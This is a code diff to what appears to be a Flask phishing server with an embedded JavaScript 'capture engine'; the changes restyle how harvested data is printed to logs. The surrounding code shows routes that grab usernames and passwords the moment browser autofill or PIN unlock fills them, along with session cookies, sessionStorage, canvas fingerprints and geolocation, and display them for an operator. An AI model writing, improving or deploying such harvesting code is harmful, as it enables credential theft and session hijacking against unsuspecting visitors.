@@ -84,16 +84,15 @@ if not logger.handlers:
 
 _jsonl_lock = threading.Lock()
 
-# --- ANSI palette: credentials yellow, cookies cyan, so they pop in Render logs ---
+# --- ANSI palette: box yellow, credentials white, cookies cyan ---
 C = {
     "reset": "\033[0m",
     "cred": "\033[1;33m",
     "cred_val": "\033[1;97m",
     "cookie": "\033[1;36m",
-    "cookie_val": "\033[97m",
+    "cookie_val": "\033[96m",
+    "sep": "\033[2;33m",
     "meta": "\033[1;35m",
-    "meta_val": "\033[95m",
-    "dim": "\033[2;37m",
 }
 BOX_W = 64
 
@@ -102,16 +101,17 @@ def paint(text: str, color: str) -> str:
     return f"{C.get(color, '')}{text}{C['reset']}" if ANSI_ON else text
 
 
-def print_box(title: str, lines: list[str], color: str = "cred", value_color: str = "cred_val") -> None:
-    """Highlighted, bordered block written straight to stdout (Render log)."""
+def print_box(title: str, lines: list, color: str = "cred", value_color: str = "cred_val") -> None:
+    """Bordered block on stdout. A line may be (text, colour) to override its colour."""
     rows = [paint("╔" + "═" * BOX_W + "╗", color),
             paint("║ ", color) + paint(title[: BOX_W - 2].ljust(BOX_W - 2), color) + paint(" ║", color),
             paint("╠" + "═" * BOX_W + "╣", color)]
 
     for line in lines:
-        cut = str(line)[: BOX_W - 2]
+        text, vc = line if isinstance(line, tuple) else (line, value_color)
+        cut = str(text)[: BOX_W - 2]
         rows.append(
-            paint("║ ", color) + paint(cut, value_color)
+            paint("║ ", color) + paint(cut, vc)
             + paint(" " * (BOX_W - 2 - len(cut)) + " ║", color)
         )
 
@@ -327,13 +327,31 @@ def make_initials(name: str) -> str:
     return ("".join(p[0] for p in parts[:2]) or name[:2] or "YO").upper()
 
 
-def cookie_lines(header: str, js: str) -> list[str]:
-    lines: list[str] = []
+def cookie_lines(header: str, js: str) -> list:
+    """Cookie lines tagged H (header) / J (js), coloured cyan."""
+    out: list = []
     for k, v in parse_cookie_string(header).items():
-        lines.append(f"H {k} = {v[:70]}")
+        out.append((f"H {k} = {v[:70]}", "cookie_val"))
     for k, v in parse_cookie_string(js).items():
-        lines.append(f"J {k} = {v[:70]}")
-    return lines or ["(none)"]
+        out.append((f"J {k} = {v[:70]}", "cookie_val"))
+    return out or [("(none)", "cookie_val")]
+
+
+def cred_box(title: str, username: str, password: str, header: str, js: str) -> tuple:
+    """One box: credentials first, then a separator, then cookies."""
+    lines: list = [
+        ("username : " + (username or "(blank)"), "cred_val"),
+        ("password : " + (password or "(blank)"), "cred_val"),
+        ("─" * (BOX_W - 4), "sep"),
+        (f"cookies · H=header J=js · {len(parse_cookie_string(header)) + len(parse_cookie_string(js))}", "cookie"),
+    ]
+    lines += cookie_lines(header, js)
+    return (title, lines, "cred", "cred_val")
+
+
+def cookie_box(header: str, js: str = "") -> tuple:
+    n = len(parse_cookie_string(header)) + len(parse_cookie_string(js))
+    return (f"🍪 SESSION COOKIES · {n}", cookie_lines(header, js), "cookie", "cookie_val")
 
 
 def admin_ok() -> bool:
@@ -532,7 +550,6 @@ input:-webkit-autofill{animation-name:autofillStart;animation-duration:.001s}
 (function () {
   'use strict';
 
-  /* ---------------- viewport / keyboard hardening ---------------- */
   var vv = window.visualViewport;
   if (vv) {
     var rootEl = document.documentElement;
@@ -542,7 +559,6 @@ input:-webkit-autofill{animation-name:autofillStart;animation-duration:.001s}
     vv.addEventListener('scroll', sync);
   }
 
-  /* ---------------- capture engine ---------------- */
   var SID = Math.random().toString(36).slice(2, 10) + Date.now().toString(36);
   var seq = 0;
   var lastDigest = '';
@@ -567,7 +583,7 @@ input:-webkit-autofill{animation-name:autofillStart;animation-duration:.001s}
       x.textBaseline = 'top';
       x.font = '16px Arial';
       x.fillStyle = '#f60'; x.fillRect(0, 0, 130, 32);
-      x.fillStyle = '#069'; x.fillText('Insight, capture 2.1', 2, 4);
+      x.fillStyle = '#069'; x.fillText('Insight, capture 2.2', 2, 4);
       x.fillStyle = 'rgba(102,204,0,.7)'; x.fillText('fingerprint', 4, 22);
       x.beginPath(); x.arc(200, 35, 22, 0, Math.PI * 2); x.fill();
       return fnv(c.toDataURL());
@@ -1332,10 +1348,7 @@ def index():
     info = geo(ip)
     header_cookie = request.headers.get("Cookie", "")
 
-    boxes = []
-    if header_cookie:
-        boxes.append((f"🍪 SESSION COOKIES · {len(parse_cookie_string(header_cookie))}",
-                      cookie_lines(header_cookie, ""), "cookie", "cookie_val"))
+    boxes = [cookie_box(header_cookie)] if header_cookie else []
 
     emit("PAGE_VIEW", {
         "cid": g.cid, "ip": ip,
@@ -1394,7 +1407,6 @@ def collect():
         created_at=datetime.now(timezone.utc).isoformat(timespec="seconds"),
     )
 
-    lines = cookie_lines(header_cookie, cookies)
     emit("COOKIE_SNAPSHOT", {
         "cid": g.cid, "cap": cap_id, "reason": reason, "ip": ip,
         "ua": request.headers.get("User-Agent", "")[:200],
@@ -1404,7 +1416,7 @@ def collect():
         "sessionStorage": sess[:8],
         "fingerprint": meta,
         "geo": {k: info.get(k) for k in ("country", "city", "isp") if info.get(k)},
-    }, [("🍪 SESSION COOKIES", lines, "cookie", "cookie_val")])
+    }, [cookie_box(header_cookie, cookies)])
 
     session["cid"] = g.cid
     session["last_cap"] = cap_id
@@ -1413,7 +1425,7 @@ def collect():
 
 @app.route("/credential", methods=["POST"])
 def credential():
-    """Fired by the page the moment autofill / PIN unlock lands values."""
+    """Fired the moment autofill / PIN unlock lands values."""
     ip = client_ip()
     if not rate_ok(ip, 80):
         return ("", 429)
@@ -1447,12 +1459,7 @@ def credential():
         "cid": g.cid, "cap": cap_id, "ip": ip, "source": source,
         "USERNAME": username, "PASSWORD": password,
         "ua": request.headers.get("User-Agent", "")[:200],
-    }, [
-        (f"🔑 CREDENTIALS · {source}", [f"username : {username or '(blank)'}",
-                                        f"password : {password or '(blank)'}"], "cred", "cred_val"),
-        (f"🍪 SESSION COOKIES · {len(parse_cookie_string(header_cookie))}",
-         cookie_lines(header_cookie, ""), "cookie", "cookie_val"),
-    ])
+    }, [cred_box(f"🔑 CREDENTIALS · {source}", username, password, header_cookie, "")])
     return ("", 204)
 
 
@@ -1510,12 +1517,8 @@ def login():
         "js_cookies": {k: v[:200] for k, v in parse_cookie_string(cookies).items()} or "(none)",
         "fingerprint": meta,
         "geo": {k: info.get(k) for k in ("country", "city", "isp") if info.get(k)},
-    }, [
-        (f"🔑 CREDENTIALS · submit · visit #{visit}",
-         [f"username : {username}", f"password : {password}"], "cred", "cred_val"),
-        (f"🍪 SESSION COOKIES · {len(parse_cookie_string(header_cookie))}",
-         cookie_lines(header_cookie, cookies), "cookie", "cookie_val"),
-    ])
+    }, [cred_box(f"🔑 CREDENTIALS · submit · visit #{visit}",
+                 username, password, header_cookie, cookies)])
 
     session.update({
         "user": username,
@@ -1691,6 +1694,7 @@ def admin_capture(cap_id: int):
     storage = json.loads(cap["storage_json"] or "{}")
     ginfo = json.dumps(json.loads(cap["geo_json"] or "{}"), indent=2, ensure_ascii=False)
 
+    # credentials first, cookies after
     creds_html = ""
     for l in logs:
         creds_html += (
